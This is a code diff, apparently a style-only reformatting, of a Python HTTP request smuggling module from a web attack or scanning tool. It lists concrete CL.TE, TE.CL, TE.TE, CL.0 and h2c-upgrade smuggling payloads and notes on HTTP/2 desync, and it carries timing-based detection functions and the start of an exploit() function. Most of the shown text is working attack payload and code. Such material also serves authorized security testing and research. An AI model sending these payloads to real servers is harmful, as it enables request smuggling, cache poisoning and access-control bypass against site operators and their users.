@@ -11,87 +11,87 @@ logger = get_logger("smuggler")
 CL_TE_PAYLOADS = [
     (
         "cl_te_basic",
-        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:"
+        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:",
     ),
     (
         "cl_te_garbage",
-        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404smuggled?t={ts} HTTP/1.1\r\nX:"
+        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404smuggled?t={ts} HTTP/1.1\r\nX:",
     ),
     (
         "cl_te_space_cl",
-        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length : 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:"
+        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length : 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:",
     ),
     (
         "cl_te_leading_zero",
-        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 013\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:"
+        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 013\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:",
     ),
     (
         "cl_te_tab_te",
-        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 13\r\nTransfer-Encoding:\tchunked\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:"
+        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 13\r\nTransfer-Encoding:\tchunked\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:",
     ),
 ]
 
 TE_CL_PAYLOADS = [
     (
         "te_cl_basic",
-        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\n\r\n0\r\n\r\n"
+        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\n\r\n0\r\n\r\n",
     ),
     (
         "te_cl_x",
-        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 10\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:"
+        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 10\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:",
     ),
     (
         "te_cl_no_cl",
-        "POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nHost: {host}\r\n\r\n0\r\n\r\n"
+        "POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nHost: {host}\r\n\r\n0\r\n\r\n",
     ),
     (
         "te_cl_obfuscated",
-        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 10\r\nTransfer-Encoding : chunked\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:"
+        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 10\r\nTransfer-Encoding : chunked\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:",
     ),
 ]
 
 TE_TE_PAYLOADS = [
     (
         "te_te_case",
-        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 10\r\nTransfer-Encoding: xchunked\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:"
+        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 10\r\nTransfer-Encoding: xchunked\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:",
     ),
     (
         "te_te_spaces",
-        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 10\r\nTransfer-Encoding:\t chunked\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:"
+        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 10\r\nTransfer-Encoding:\t chunked\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:",
     ),
     (
         "te_te_obfuscated",
-        "POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: x\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:"
+        "POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: x\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:",
     ),
     (
         "te_te_semicolon",
-        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 10\r\nTransfer-Encoding: chunked;foo=bar\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:"
+        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 10\r\nTransfer-Encoding: chunked;foo=bar\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:",
     ),
     (
         "te_te_double",
-        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 10\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:"
+        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 10\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:",
     ),
     (
         "te_te_space_before_colon",
-        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 10\r\nTransfer-Encoding : chunked\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:"
+        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 10\r\nTransfer-Encoding : chunked\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404smuggled HTTP/1.1\r\nX:",
     ),
 ]
 
 CL_0_PAYLOADS = [
     (
         "cl_0_basic",
-        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 0\r\n\r\nGET /404smuggled HTTP/1.1\r\nHost: {host}\r\nX:"
+        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 0\r\n\r\nGET /404smuggled HTTP/1.1\r\nHost: {host}\r\nX:",
     ),
     (
         "cl_0_keepalive",
-        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\nGET /404smuggled HTTP/1.1\r\nHost: {host}\r\nX:"
+        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\nGET /404smuggled HTTP/1.1\r\nHost: {host}\r\nX:",
     ),
 ]
 
 H2C_UPGRADE_PAYLOADS = [
     (
         "h2c_upgrade",
-        "GET / HTTP/1.1\r\nHost: {host}\r\nConnection: Upgrade, HTTP2-Settings\r\nUpgrade: h2c\r\nHTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\r\n"
+        "GET / HTTP/1.1\r\nHost: {host}\r\nConnection: Upgrade, HTTP2-Settings\r\nUpgrade: h2c\r\nHTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\r\n",
     ),
 ]
 
@@ -103,14 +103,14 @@ H2_DESYNC_PATTERNS = [
     {
         "type": "h2_cl_desync",
         "note": "Front-end uses HTTP/1.1 Content-Length while back-end speaks "
-                "HTTP/2 (or vice versa): send CL:0 on the outer request and a "
-                "full second request inside the stream - requires an h2 client.",
+        "HTTP/2 (or vice versa): send CL:0 on the outer request and a "
+        "full second request inside the stream - requires an h2 client.",
     },
     {
         "type": "h2_te_desync",
         "note": "Transfer-Encoding smuggled into HTTP/2 (illegal in h2, but "
-                "proxies translating h2 -> h1 may mis-handle it): inject "
-                "TE: chunked via a lowercased/space-obfuscated header.",
+        "proxies translating h2 -> h1 may mis-handle it): inject "
+        "TE: chunked via a lowercased/space-obfuscated header.",
     },
 ]
 
@@ -119,13 +119,16 @@ SMUGGLING_MARKER = "/404smuggled"
 
 def _extract_host_port(url: str) -> tuple:
     from urllib.parse import urlparse
+
     parsed = urlparse(url)
     host = parsed.hostname or "localhost"
     port = parsed.port or (443 if parsed.scheme == "https" else 80)
     return host, port
 
 
-def _raw_http_request(host: str, port: int, raw_request: str, timeout: float = 10.0) -> Optional[str]:
+def _raw_http_request(
+    host: str, port: int, raw_request: str, timeout: float = 10.0
+) -> Optional[str]:
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(timeout)
@@ -201,11 +204,22 @@ def _detect_te_cl(host: str, port: int, timeout: float) -> List[Dict]:
     results = []
     for name, tpl in TE_CL_PAYLOADS:
         payload = tpl.format(host=host)
-        normal_avg = _detect_via_delay(host, port, "GET / HTTP/1.1\r\nHost: %s\r\n\r\n" % host, timeout)
+        normal_avg = _detect_via_delay(
+            host, port, "GET / HTTP/1.1\r\nHost: %s\r\n\r\n" % host, timeout
+        )
         smug_avg = _detect_via_delay(host, port, payload, timeout)
         if smug_avg > normal_avg * 2.5:
-            results.append({"type": "te_cl", "variant": name, "detected": True, "delay": round(smug_avg - normal_avg, 2)})
-            logger.info("TE.CL smuggling detected via %s (delay %.2fs)", name, smug_avg - normal_avg)
+            results.append(
+                {
+                    "type": "te_cl",
+                    "variant": name,
+                    "detected": True,
+                    "delay": round(smug_avg - normal_avg, 2),
+                }
+            )
+            logger.info(
+                "TE.CL smuggling detected via %s (delay %.2fs)", name, smug_avg - normal_avg
+            )
             return results
     return results
 
@@ -273,8 +287,14 @@ def _detect_h2_prior_knowledge(host: str, port: int, timeout: float) -> List[Dic
         sock.close()
         # h2 server replies with a SETTINGS frame - no "HTTP/1.1" status line
         if response and b"HTTP/1.1" not in response and len(response) >= 9:
-            return [{"type": "h2_prior_knowledge", "variant": "preface",
-                     "detected": True, "patterns": H2_DESYNC_PATTERNS}]
+            return [
+                {
+                    "type": "h2_prior_knowledge",
+                    "variant": "preface",
+                    "detected": True,
+                    "patterns": H2_DESYNC_PATTERNS,
+                }
+            ]
     except Exception as e:
         logger.debug("h2 prior knowledge: %s", e)
     return []
@@ -314,8 +334,12 @@ def _detect_cl_0(host: str, port: int, timeout: float) -> List[Dict]:
     return results
 
 
-def check(url: str, param: Optional[str] = None, sess: Optional[requests.Session] = None,
-          timeout: float = 10.0) -> Dict:
+def check(
+    url: str,
+    param: Optional[str] = None,
+    sess: Optional[requests.Session] = None,
+    timeout: float = 10.0,
+) -> Dict:
     host, port = _extract_host_port(url)
     result = {
         "vulnerable": False,
@@ -331,7 +355,9 @@ def check(url: str, param: Optional[str] = None, sess: Optional[requests.Session
             r = sess or requests.Session()
             resp = r.get(url, timeout=timeout)
             if resp.status_code < 500:
-                logger.info("Target speaks HTTP/1.1 over TLS, testing smuggling via HTTP/1.1 fallback")
+                logger.info(
+                    "Target speaks HTTP/1.1 over TLS, testing smuggling via HTTP/1.1 fallback"
+                )
         except Exception:
             pass
     findings = []
@@ -353,8 +379,13 @@ def check(url: str, param: Optional[str] = None, sess: Optional[requests.Session
     return result
 
 
-def exploit(url: str, attack_type: str = "cl_te", attack_body: str = "",
-            sess: Optional[requests.Session] = None, timeout: float = 10.0) -> Dict:
+def exploit(
+    url: str,
+    attack_type: str = "cl_te",
+    attack_body: str = "",
+    sess: Optional[requests.Session] = None,
+    timeout: float = 10.0,
+) -> Dict:
     host, port = _extract_host_port(url)
     result = {"success": False, "type": attack_type, "response": None}
     host_header = host.split(":")[0]
